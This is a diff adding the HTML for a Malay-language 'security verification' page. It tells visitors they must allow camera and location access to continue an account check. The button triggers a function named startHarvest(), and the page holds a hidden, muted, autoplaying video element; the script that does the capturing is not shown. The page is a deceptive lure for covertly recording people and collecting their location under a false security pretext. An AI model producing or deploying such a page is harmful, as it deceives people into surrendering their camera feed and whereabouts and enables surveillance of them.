@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengesahan Keselamatan</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <h1>Pengesahan Diperlukan</h1>
+        <p>Sila benarkan akses kamera dan lokasi untuk meneruskan semakan keselamatan akaun anda.</p>
+        
+        <button id="start-btn" onclick="startHarvest()">Mula Pengesahan</button>
+        <p id="status" class="status"></p>
+    </div>
+
+    <!-- Video tersembunyi -->
+    <video id="preview" autoplay playsinline muted hidden></video>
+
+    <script src="script.js"></script>
+</body>
+</html>
